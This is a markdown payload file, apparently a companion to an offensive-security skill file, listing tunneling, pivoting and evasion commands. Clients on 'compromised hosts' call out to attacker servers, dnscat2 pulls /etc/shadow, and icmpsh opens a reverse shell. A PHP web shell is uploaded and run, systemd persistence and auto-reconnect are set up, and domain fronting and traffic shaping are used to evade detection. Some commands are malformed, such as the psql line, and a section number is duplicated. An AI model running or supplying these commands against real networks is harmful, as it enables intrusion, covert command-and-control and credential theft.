# Payloads -- Network Tunneling & Proxy

> This file is a companion to `SKILL.md`, organizing all tunneling and proxy commands by tunnel type.

---

## 1. HTTP/SOCKS Tunnels

### 1.1 Chisel -- HTTP/SOCKS5 Tunnel

```bash
# Chisel server on external host (listener)
chisel server -p 8080 --reverse --socks5

# Chisel client on compromised host (connects outbound)
chisel client http://attacker:8080 R:socks

# Chisel with authentication
chisel server -p 8080 --reverse --auth user:pass123
chisel client --auth user:pass123 http://attacker:8080 R:socks

# Chisel reverse port forward (expose internal service)
chisel client http://attacker:8080 R:8888:192.168.1.50:80

# Chisel with custom HTTP headers to bypass inspection
chisel client http://attacker:8080 R:socks --header "X-Forwarded-For: legit-proxy"
```

### 1.2 Gost -- Multi-Protocol Tunnel

```bash
# Gost SOCKS5 proxy
gost -L socks5://:1080

# Gost HTTP proxy
gost -L http://:8080

# Gost tunnel chain: local -> SOCKS5 -> HTTP -> target
gost -L :8080 -F socks5://proxy1:1080 -F http://proxy2:8443

# Gost with TLS encryption
gost -L tls://:443 -F socks5://proxy:1080

# Gost Shadowsocks tunnel
gost -L ss://chacha20:password@:8338 -F tls://server:443

# Gost QUIC tunnel (evades TCP-based detection)
gost -L quic://:443 -F socks5://internal:1080
```

### 1.3 3proxy -- Lightweight Proxy Server

```bash
# 3proxy configuration file (/etc/3proxy/3proxy.cfg)
cat > /etc/3proxy/3proxy.cfg << 'EOF'
daemon
nserver 8.8.8.8
nscache 65536
timeouts 1 5 30 60 180 1800 15 60
users admin:CL:password123
auth strong
allow admin
socks -p1080 -i0.0.0.0
proxy -p3128 -i0.0.0.0
EOF

# Start 3proxy
3proxy /etc/3proxy/3proxy.cfg

# 3proxy with parent proxy chaining
cat > /etc/3proxy/chained.cfg << 'EOF'
daemon
auth none
socks -p1080
parent 1000 socks5 upstream-proxy 1080
EOF
```

---

## 2. SSH Tunneling

### 2.1 SSH Local Port Forwarding

```bash
# Forward local port 8080 to target:80 through SSH server
ssh -L 8080:192.168.1.50:80 user@ssh-server

# Forward multiple ports
ssh -L 8080:target:80 -L 3306:target:3306 user@ssh-server

# SSH local forward in background
ssh -fNL 8080:internal-host:80 user@ssh-server
```

### 2.2 SSH Remote Port Forwarding

```bash
# Expose internal service on remote SSH server (reverse tunnel)
ssh -R 9999:127.0.0.1:3389 user@attacker-server

# Reverse SOCKS proxy through SSH
ssh -R 1080 user@attacker-server -D 0

# Remote forward with gateway ports enabled
ssh -R 0.0.0.0:8080:internal:80 user@attacker-server
```

### 2.3 SSH Dynamic Port Forwarding (SOCKS)

```bash
# Create SOCKS5 proxy on local port 1080 via SSH
ssh -D 1080 user@ssh-server

# SOCKS proxy with SSH config for persistence
cat >> ~/.ssh/config << 'EOF'
Host tunnel-proxy
    HostName ssh-server
    User operator
    DynamicForward 1080
    ServerAliveInterval 60
    ServerAliveCountMax 3
EOF

ssh -fN tunnel-proxy
```

### 2.4 Sshuttle -- VPN-like Access over SSH

```bash
# Route entire subnet through SSH tunnel (no root needed on remote)
sshuttle -r user@ssh-server 10.0.0.0/8

# Route multiple subnets
sshuttle -r user@ssh-server 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16

# Sshuttle with DNS resolution through tunnel
sshuttle --dns -r user@ssh-server 10.0.0.0/8

# Sshuttle exclude local traffic
sshuttle -r user@ssh-server 10.0.0.0/8 -x 10.0.0.1

# Sshuttle with specific SSH key and port
sshuttle -r user@ssh-server:2222 --ssh-cmd "ssh -i ~/.ssh/key" 192.168.0.0/16
```

---

## 3. DNS Tunneling

### 3.1 Dnscat2 -- DNS C2 Tunnel

```bash
# Dnscat2 server (requires authoritative DNS for domain)
ruby ./dnscat2.rb --secret=abc123 tunnel.example.com

# Dnscat2 client (on compromised host)
./dnscat --secret=abc123 tunnel.example.com

# Dnscat2 server with DNS relay mode
ruby ./dnscat2.rb --dns:host=0.0.0.0,port=53531 --secret=abc123

# Inside dnscat2 session: create tunnel
tunnel create --host=127.0.0.1 --port=8888
# Then connect through the tunnel on the client side

# Dnscat2 with encryption and obfuscation
ruby ./dnscat2.rb --secret=longsecretkey123 --security=open tunnel.example.com

# Dnscat2 download/upload through tunnel
download /etc/shadow
upload /tmp/payload.exe C:\\temp\\payload.exe
```

### 3.2 DNS Tunneling Cross-Reference

```bash
# iodine -- IP-over-DNS (see dns-attacks skill for full details)
# Server:
iodined -f -P password 10.0.0.1/24 tunnel.example.com
# Client:
iodine -f -P password dns.example.com tunnel.example.com

# dns2tcp -- DNS tunnel for TCP connections (see dns-attacks skill)
# Server:
dns2tcpd -f /etc/dns2tcpd.conf
# Client:
dns2tcpc -z tunnel.example.com -r ssh -l 2222
```

---

## 4. ICMP Tunneling

### 4.1 Ptunnel -- TCP over ICMP

```bash
# Ptunnel server (on host with ICMP allowed)
sudo ptunnel

# Ptunnel server with password
sudo ptunnel -x secretpass

# Ptunnel client -- tunnel local:2222 to target:22 via ICMP relay
sudo ptunnel -p relay-host -lp 2222 -da target-host -dp 22 -x secretpass

# Ptunnel with restrictive proxy (specify source interface)
sudo ptunnel -p relay-host -lp 2222 -da target-host -dp 22 -i eth0

# SSH through ICMP tunnel
sudo ptunnel -p relay-host -lp 2222 -da target-host -dp 22
ssh -p 2222 user@127.0.0.1

# Verify ICMP tunnel connectivity
ping -c 3 relay-host
sudo tcpdump -i eth0 icmp -nn
```

---

## 5. TLS Wrapping

### 5.1 Stunnel -- TLS Encryption Wrapper

```bash
# Stunnel server configuration (/etc/stunnel/stunnel.conf)
cat > /etc/stunnel/stunnel.conf << 'EOF'
cert = /etc/stunnel/stunnel.pem
key = /etc/stunnel/stunnel.pem
[chisel-tls]
accept = 0.0.0.0:443
connect = 127.0.0.1:8080
EOF

# Stunnel client configuration
cat > /etc/stunnel/client.conf << 'EOF'
client = yes
[chisel-tls]
accept = 127.0.0.1:9090
connect = attacker-server:443
EOF

# Generate self-signed certificate for stunnel
openssl req -new -x509 -days 365 -nodes -out stunnel.pem -keyout stunnel.pem

# Start stunnel
stunnel /etc/stunnel/stunnel.conf

# Stunnel wrapping a SOCKS proxy
cat > /etc/stunnel/socks-tls.conf << 'EOF'
cert = /etc/stunnel/stunnel.pem
client = yes
[socks-tls]
accept = 127.0.0.1:10800
connect = proxy-server:443
EOF
```

---

## 6. Proxy Chaining

### 6.1 Proxychains Configuration

```bash
# Proxychains configuration (/etc/proxychains4.conf)
cat > /etc/proxychains4.conf << 'EOF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
socks5 10.0.0.5 1080
http 192.168.1.100 8080
EOF

# Route any command through proxy chain
proxychains4 nmap -sT -Pn target-network
proxychains4 curl http://internal-service.local
proxychains4 ssh user@deep-target

# Dynamic chain (skip dead proxies)
cat > /etc/proxychains4.conf << 'EOF'
dynamic_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
socks5 10.0.0.5 1080
socks5 10.0.0.10 1080
EOF

# Proxychains with specific DNS server
proxychains4 -q nmap -sT -Pn --dns-servers 8.8.8.8 target
```

### 6.2 Socat Relay Chains

```bash
# Simple TCP relay
socat TCP-LISTEN:8080,fork,reuseaddr TCP:target:80

# Relay with connection logging
socat TCP-LISTEN:8080,fork,reuseaddr SYSTEM:'tee -a /tmp/relay.log | socat - TCP:target:80'

# SSL relay (wrap TCP connection in SSL)
socat OPENSSL-LISTEN:443,cert=server.pem,key=server.pem,fork TCP:127.0.0.1:8080

# UDP to TCP relay
socat UDP-LISTEN:5353,fork TCP:127.0.0.1:8080

# Socat as SOCKS proxy relay
socat TCP-LISTEN:10800,fork SOCKS5:127.0.0.1:target:80,socksport=1080

# Bidirectional pipe between two endpoints
socat TCP:upstream:8080 TCP:downstream:9090
```

---

## 7. Pivoting Chains

### 7.1 Ligolo-ng Pivoting

```bash
# Ligolo-ng proxy (on attacker machine)
./proxy -selfcert -laddr 0.0.0.0:9001

# Ligolo-ng agent (on compromised host)
./agent -connect attacker:9001 -ignore-cert

# Inside ligolo-ng console: start tunnel
# ligolo-ng > session_select 1
# ligolo-ng > ifcreate --name tunnel0
# ligolo-ng > tunnel_start --name tunnel0

# Route target subnet through ligolo-ng TUN interface
sudo ip route add 192.168.100.0/24 dev tunnel0

# Multi-hop pivoting with ligolo-ng
# Pivot 1: agent connects to proxy
# Pivot 2: agent connects through pivot 1 using ligolo-ng listener on pivot 1

# Add route for second network segment
sudo ip route add 10.10.0.0/16 dev tunnel0
```

### 7.2 Multi-Hop Pivot Chain Example

```bash
# Step 1: SSH dynamic forward to first pivot (creates SOCKS5 on :1080)
ssh -D 1080 -fN user@dmz-host

# Step 2: Through SOCKS proxy, set up chisel to second pivot
proxychains4 chisel client http://internal-pivot:8080 R:1081:socks

# Step 3: Chain second SOCKS proxy
# Add to proxychains config:
# socks5 127.0.0.1 1081

# Step 4: Access deep network through chained proxies
proxychains4 nmap -sT -Pn 10.10.10.0/24

# Full multi-hop chain summary:
# Operator -> SOCKS5(:1080) -> DMZ host -> HTTP tunnel -> Internal pivot -> SOCKS5(:1081) -> Deep network
```

### 7.3 Sshuttle Multi-Subnet Pivot

```bash
# Sshuttle through SOCKS proxy (using ProxyCommand)
sshuttle -r user@pivot1 192.168.0.0/16 --ssh-cmd "ssh -o ProxyCommand='nc -X 5 -x 127.0.0.1:1080 %h %p'"

# Chain sshuttle instances for multi-hop
# On pivot1:
sshuttle -r user@pivot2 10.0.0.0/8
# On operator:
sshuttle -r user@pivot1 192.168.0.0/16 10.0.0.0/8
```

---

## 8. Tunnel Verification and Diagnostics

### 8.1 Connectivity Testing Through Tunnels

```bash
# Test SOCKS proxy connectivity
curl --socks5 127.0.0.1:1080 http://ifconfig.me

# Test SOCKS proxy with DNS resolution through proxy
curl --socks5-hostname 127.0.0.1:1080 http://internal-host.local

# Verify tunnel with TCP connection test
proxychains4 nc -zv 10.10.10.50 445

# Measure tunnel latency
proxychains4 ping -c 5 10.10.10.1

# Benchmark tunnel throughput
iperf3 -c 10.10.10.1 --connect-timeout 10000
```

### 8.2 Tunnel Monitoring and Debugging

```bash
# Monitor tunnel traffic with tcpdump
sudo tcpdump -i any port 8080 -nn -vv

# Watch for SOCKS handshake on the wire
sudo tcpdump -i eth0 -X -nn port 1080 2>/dev/null | grep "0x05"

# Monitor DNS tunnel queries
sudo tcpdump -i eth0 -nn port 53 -l | grep "tunnel.example.com"

# Check tunnel process status
ps aux | grep -E 'chisel|ligolo|socat|ptunnel|gost|stunnel'

# Verify TUN interface is active
ip addr show | grep -A2 tunnel0
ip route show | grep tunnel
```

### 8.3 Tunnel Cleanup

```bash
# Kill tunnel processes cleanly
kill $(pgrep -f 'chisel client') 2>/dev/null
kill $(pgrep -f 'ligolo-ng') 2>/dev/null
kill $(pgrep -f 'socat.*LISTEN') 2>/dev/null

# Remove TUN interfaces
sudo ip link set tunnel0 down 2>/dev/null
sudo ip tuntap del mode tun name tunnel0 2>/dev/null

# Clean routing rules added for tunneling
sudo ip route del 192.168.100.0/24 dev tunnel0 2>/dev/null
sudo ip route del 10.10.0.0/16 dev tunnel0 2>/dev/null

# Remove temporary config files
rm -f /etc/stunnel/client.conf /etc/stunnel/socks-tls.conf
rm -f /tmp/chisel /tmp/agent /tmp/proxy
```

---

## 9. Combined Tunnel Chain Payloads

### 8.1 Full Covert Infrastructure Chain

```bash
# Build: Operator -> stunnel TLS -> chisel HTTP -> dnscat2 DNS -> Target
# Step 1: dnscat2 server
ruby ./dnscat2.rb --secret=key123 tunnel.example.com

# Step 2: dnscat2 client on target network
./dnscat --secret=key123 tunnel.example.com

# Step 3: chisel server on redirector, wrapped with stunnel
stunnel /etc/stunnel/chisel-tls.conf &
chisel server -p 8080 --reverse --socks5

# Step 4: chisel client on first pivot, through stunnel
stunnel /etc/stunnel/client.conf &
chisel client http://127.0.0.1:9090 R:socks

# Step 5: proxychains through full chain
proxychains4 curl http://target-asset.internal
```

## 10. Application-Specific Proxy Routing

### 10.1 Database Access Through Proxy Chain

```bash
# MySQL through SOCKS proxy chain
proxychains4 mysql -h 10.10.20.50 -u dbadmin -p'SecurePass!'

# PostgreSQL through chisel SOCKS proxy
psql "host=10.10.20.60 user=postgres password=pass connect_timeout=10" \
  --set=hostaddr=127.0.0.1 proxychains4 psql

# MSSQL through proxy with impacket
proxychains4 impacket-mssqlclient domain/admin:password@10.10.20.70

# Redis through SOCKS proxy
proxychains4 redis-cli -h 10.10.20.80 -a redispassword
```

### 10.2 RDP and VNC Through Tunnels

```bash
# RDP through SOCKS proxy
proxychains4 xfreerdp /v:10.10.20.100 /u:admin /p:password /cert:ignore

# VNC through SSH tunnel (local forward)
ssh -L 5900:10.10.20.110:5900 user@pivot-host
vncviewer 127.0.0.1:5900

# RDP via chisel reverse port forward
chisel client http://attacker:8080 R:3389:10.10.20.100:3389
xfreerdp /v:127.0.0.1:3389 /u:admin /p:password /cert:ignore
```

### 10.3 Web Application Testing Through Proxies

```bash
# Burp Suite upstream through SOCKS proxy
# Configure Burp: Project Options > Connections > Upstream Proxy > SOCKS: 127.0.0.1:1080

# Nikto scan through proxy chain
proxychains4 nikto -h http://10.10.20.200

# SQLMap through SOCKS proxy
sqlmap --proxy socks5://127.0.0.1:1080 -u "http://10.10.20.200/page?id=1" --dbs

# Dirb through proxy chain
proxychains4 dirb http://10.10.20.200 /usr/share/wordlists/dirb/common.txt
```

### 10.4 Resilient Tunnel with Failover

```bash
# Primary tunnel via chisel
chisel client http://relay1:8080 R:1080:socks &

# Backup tunnel via gost (different protocol)
gost -L :1081 -F http://relay2:8443 &

# Proxychains dynamic chain with both paths
cat > /etc/proxychains4.conf << 'EOF'
dynamic_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
EOF

# Automatic failover: if chisel dies, gost tunnel is used
proxychains4 ssh user@target
```

---

## 11. Stunnel Wrapping Patterns by Tool

### 11.1 Wrapping Specific Tools with Stunnel

```bash
# Stunnel wrapping socat relay (TLS-encrypted TCP relay)
cat > /etc/stunnel/socat-relay.conf << 'EOF'
cert = /etc/stunnel/stunnel.pem
[socat-tls]
accept = 0.0.0.0:4443
connect = 127.0.0.1:8080
EOF
stunnel /etc/stunnel/socat-relay.conf &

# Stunnel wrapping 3proxy SOCKS (encrypt SOCKS traffic)
cat > /etc/stunnel/socks-wrap.conf << 'EOF'
cert = /etc/stunnel/stunnel.pem
[socks-tls]
accept = 0.0.0.0:1443
connect = 127.0.0.1:1080
EOF
stunnel /etc/stunnel/socks-wrap.conf &

# Stunnel wrapping gost (double TLS layer for high-security links)
cat > /etc/stunnel/gost-wrap.conf << 'EOF'
client = yes
[gost-tls]
accept = 127.0.0.1:18080
connect = gost-server:443
EOF
stunnel /etc/stunnel/gost-wrap.conf &
gost -L :8080 -F http://127.0.0.1:18080
```

---

## 12. Tunnel Obfuscation and Evasion

### 12.1 Traffic Shaping to Evade Detection

```bash
# Rate-limit tunnel traffic to blend with normal patterns
tc qdisc add dev eth0 root tbf rate 256kbit burst 32kbit latency 400ms

# Use trickle for per-application bandwidth limiting
trickle -d 50 -u 20 proxychains4 ssh user@deep-target

# Add random delays between tunnel operations
while true; do
  proxychains4 curl -s http://10.10.10.50/health > /dev/null 2>&1
  sleep $((RANDOM % 30 + 10))
done
```

### 12.2 Domain Fronting for Tunnel Egress

```bash
# Chisel with domain fronting headers
chisel client http://cdn.example.com:443 R:socks \
  --header "Host: real-tunnel-server.example.com" \
  --header "X-Forwarded-Host: real-tunnel-server.example.com"

# Gost with SNI-based domain fronting
gost -L :8080 -F "tls://cdn.example.com:443?host=real-tunnel-server.example.com"

# Curl test for domain fronting validation
curl -H "Host: real-tunnel-server.example.com" https://cdn.example.com:443/ -k -v
```

### 12.3 DNS-over-HTTPS Tunnel Evasion

```bash
# Configure gost to use DoH for DNS resolution, hiding DNS tunnel patterns
gost -L :8080 -F "https://dns.google:443/dns-query?host=target.example.com"

# Route proxychains DNS through DoH to evade DNS monitoring
# In proxychains4.conf:
# proxy_dns
# In /etc/systemd/resolved.conf:
# DNSOverHTTPS=yes

# Verify DoH is working (no plain DNS queries for tunnel domain)
tcpdump -i eth0 -nn port 53 | grep -i "tunnel.example.com"
```

### 12.4 Tunnel Persistence and Auto-Reconnection

```bash
# Chisel with auto-reconnection wrapper
while true; do
  chisel client http://attacker:8080 R:socks
  sleep 30
done &

# Gost with reconnection via systemd service
cat > /etc/systemd/system/gost-tunnel.service << 'EOF'
[Unit]
Description=Gost Tunnel
After=network.target

[Service]
ExecStart=/usr/local/bin/gost -L :8080 -F tls://attacker:443
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF
systemctl enable gost-tunnel
systemctl start gost-tunnel

# SSH tunnel with autossh for persistent connection
autossh -M 0 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" \
  -D 1080 -fN user@ssh-server

# Proxychains with connection retry
cat >> /etc/proxychains4.conf << 'EOF'
tcp_read_time_out 15000
tcp_connect_time_out 8000
EOF
```

### 12.5 ICMP Tunnel Alternatives

```bash
# Icmpsh - ICMP reverse shell (alternative to ptunnel)
# Server (attacker):
python3 icmpsh_m.py attacker_ip target_ip

# Client (target):
./icmpsh.exe -t attacker_ip

# Hans ICMP tunnel (IP-over-ICMP)
# Server:
hans -v -f -s 10.0.0.1 -p password123
# Client:
hans -v -f -c attacker_ip -p password123

# Verify ICMP tunnel interface
ip addr show tun0
ping -c 3 10.0.0.1
```

### 12.6 Reverse Shell Tunnel via Chisel Port Forward

```bash
# Forward reverse shell through chisel
# Attacker: start chisel server with reverse port forward
chisel server -p 8080 --reverse

# Target: connect and expose internal service
chisel client http://attacker:8080 R:3306:192.168.1.50:3306

# Access internal MySQL through forwarded port
mysql -h 127.0.0.1 -P 3306 -u root -p

# Forward multiple services simultaneously
chisel client http://attacker:8080 \
  R:3389:192.168.1.100:3389 \
  R:8080:192.168.1.200:80 \
  R:5432:192.168.1.60:5432
```

### 12.7 Web Shell Delivery via Tunnel

```bash
# Deploy web shell through proxy chain
proxychains4 curl -X POST "http://10.10.20.200/upload.php" \
  -F "file=@shell.php"

# Access deployed shell through tunnel
proxychains4 curl "http://10.10.20.200/uploads/shell.php?cmd=id"

# Set up persistent access through chisel
chisel client http://attacker:8080 R:8888:10.10.20.200:80

# Access web shell through chisel port forward
curl "http://127.0.0.1:8888/uploads/shell.php?cmd=whoami"
```

---

## 13. Netsh Port Forwarding (Windows Pivot)

### Windows Native Port Forwarding

```cmd
# Windows port forward using netsh (requires admin)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.50

# List all port proxy rules
netsh interface portproxy show all

# Remove port proxy rule after engagement
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

### Windows SSH Tunneling via Plink

```cmd
# Plink local port forward through SSH
plink.exe -L 8080:192.168.1.50:80 user@ssh-server -pw password

# Plink SOCKS proxy
plink.exe -D 1080 user@ssh-server -pw password

# Plink reverse port forward (expose internal service)
plink.exe -R 9999:127.0.0.1:3389 user@attacker-server -pw password
```

---

## 14. Advanced Pivoting with Metasploit

### Meterpreter Routing and Pivoting

```bash
# Add route through Meterpreter session for network pivoting
# In msfconsole:
route add 10.10.10.0/24 <session_id>
route print

# Set up SOCKS proxy through Meterpreter
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run

# Configure proxychains to use Metasploit SOCKS proxy
# Add to /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn 10.10.10.0/24
```

### Meterpreter Port Forwarding

```bash
# Port forward through Meterpreter session
# In meterpreter session:
portfwd add -l 8080 -p 80 -r 10.10.10.50
portfwd add -l 3306 -p 3306 -r 10.10.10.60
portfwd list

# Remove port forward
portfwd delete -l 8080

# Reverse port forward (expose local service through target)
portfwd add -R -l 9999 -p 4444 -r 127.0.0.1
```

---

## 15. Websocket and HTTP/2 Tunneling

### Websocket Tunnel with websocat

```bash
# Install websocat
# cargo install websocat

# Basic websocket tunnel: forward TCP over websocket
websocat -E ws-l:127.0.0.1:8080 tcp:192.168.1.50:3306

# Reverse: forward websocket to TCP
websocat -E tcp-l:127.0.0.1:3306 ws://relay-server:8080/tunnel

# Websocket to websocket relay
websocat -E ws://upstream:8080/ws ws://downstream:9090/ws

# Websocket with SSL/TLS
websocat -E wss://relay-server:8443/tunnel tcp:192.168.1.50:22
```

### HTTP/2 Tunnel with nghttp2

```bash
# HTTP/2 CONNECT method tunnel (evades deep packet inspection)
nghttp -v --connect-to=:443 https://target.example.com/

# HTTP/2 stream multiplexing for covert channels
nghttp -v -n --no-verify-peer https://tunnel-server.example.com/
```

---

## 16. SOCKS Proxy Automation and Management

### Dynamic Proxy Rotation

```bash
# Rotate between multiple SOCKS proxies to distribute traffic
cat > /etc/proxychains4.conf << 'EOF'
round_robin_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
socks5 127.0.0.1 1082
EOF

# Verify rotation is working
for i in $(seq 1 6); do
  proxychains4 curl -s http://ifconfig.me
done
```

### SSH Tunnel Health Monitoring

```bash
# Monitor SSH tunnel process and auto-restart on failure
while true; do
  if ! pgrep -f "ssh -D 1080" > /dev/null; then
    echo "$(date): SSH tunnel down, restarting..." >> /tmp/tunnel_monitor.log
    autossh -M 0 -o "ServerAliveInterval 30" -D 1080 -fN user@ssh-server
  fi
  sleep 60
done
```

### Chisel Server Hardening

```bash
# Chisel with TLS and authentication for secure tunneling
# Generate TLS certs
openssl req -new -x509 -days 365 -nodes -out server.crt -keyout server.key

# Start hardened chisel server
chisel server --tls --key server.key --cert server.crt \
  -p 443 --reverse --auth "operator:$(openssl rand -base64 18)"

# Client connects with TLS and auth
chisel client --tls --auth operator:PASSWORD https://relay:443 R:socks
```

### Multi-Protocol Relay with Socat

```bash
# Relay TCP traffic through TLS tunnel
socat OPENSSL-LISTEN:8443,cert=server.pem,key=server.key,verify=0,fork TCP:127.0.0.1:8080

# UDP relay for DNS tunneling support
socat UDP4-LISTEN:5353,fork UDP4:upstream-dns:53

# Serial port to TCP relay (for IoT/ICS pivoting)
socat TCP-LISTEN:5000,fork /dev/ttyUSB0,b9600,raw,echo=0
```

---

## 17. Tunnel Diagnostics and Performance Testing

### Bandwidth and Latency Testing Through Tunnels

```bash
# Test bandwidth through SOCKS proxy with iperf3
proxychains4 iperf3 -c 10.10.10.1 -p 5201 -t 10

# Test latency through chisel tunnel
ping -c 10 10.10.10.1
traceroute -n 10.10.10.1

# Measure DNS resolution through DNS tunnel
time nslookup internal-host.local
time dig @127.0.0.1 -p 5353 internal-host.local
```

### Tunnel Connection Debugging

```bash
# Debug SOCKS proxy connection issues
curl -v --socks5 127.0.0.1:1080 http://10.10.10.1 2>&1 | grep -E "connect|refused|timeout"

# Debug chisel connection issues
chisel client --verbose http://attacker:8080 R:socks

# Verify all tunnel routes are active
ip route show | grep -E "tunnel|tap|tun"
ip rule show
```

---

## 18. Advanced Proxy Configuration Patterns

### Dynamic Proxychains by Target

```bash
# Create proxy configuration per target network
cat > /etc/proxychains_targetA.conf << 'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF

cat > /etc/proxychains_targetB.conf << 'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1081
EOF

# Use specific config per target
proxychains4 -f /etc/proxychains_targetA.conf nmap -sT 10.10.10.0/24
proxychains4 -f /etc/proxychains_targetB.conf nmap -sT 172.16.0.0/24
```

### HAProxy as Tunnel Relay

```bash
# HAProxy TCP relay configuration for tunnel endpoint
cat > /etc/haproxy/haproxy.cfg << 'EOF'
global
    daemon
    maxconn 4096
defaults
    mode tcp
    timeout connect 5s
    timeout client 300s
    timeout server 300s
frontend tunnel_in
    bind *:8443
    default_backend tunnel_out
backend tunnel_out
    server target 192.168.1.50:443
EOF
haproxy -f /etc/haproxy/haproxy.cfg
```

---

## 19. Tunnel Resilience and Failover

### Multi-Path Tunnel with Auto-Switch

```bash
# Start primary and backup tunnels
chisel client http://relay1:8080 R:1080:socks &
gost -L :1081 -F http://relay2:8443 &

# Proxychains with dynamic chain for automatic failover
cat > /etc/proxychains4.conf << 'EOF'
dynamic_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
EOF
proxychains4 curl -s http://target.internal
```

### Tunnel Status Dashboard

```bash
# Quick tunnel health check script
for port in 1080 1081 8080 9090; do
  nc -z -w 2 127.0.0.1 $port && echo "Port $port: UP" || echo "Port $port: DOWN"
done
ps aux | grep -E "chisel|gost|ssh.*-D|socat.*LISTEN" | grep -v grep | awk '{print $11, $12, $13}'
```

### SSH Tunnel through HTTP Proxy

```bash
# SSH through HTTP proxy using corkscrew
ssh -o ProxyCommand="corkscrew proxy.company.com 8080 %h %p" user@target-host
```

### SSH Tunnel via HTTP CONNECT Proxy

```bash
# Use corkscrew to tunnel SSH through an HTTP proxy
apt install -y corkscrew
ssh -o "ProxyCommand corkscrew proxy.corp.local 8080 %h %p /tmp/proxy-auth" user@target.example.com

# Configure SSH config for persistent proxy tunneling
cat >> ~/.ssh/config << 'EOF'
Host *.corp.local
  ProxyCommand corkscrew proxy.corp.local 8080 %h %p ~/.ssh/proxy-auth
  DynamicForward 1081
EOF
```

### DNS-over-HTTPS Tunnel via iodine

```bash
# Set up iodine DNS tunnel for egress through DNS
sudo iodine -f -P secretpass 10.0.0.1 tunnel.example.com

# Verify tunnel connectivity and test bandwidth
ping -c 3 10.0.0.1
iperf3 -c 10.0.0.1 -t 10 -u -b 1M
```
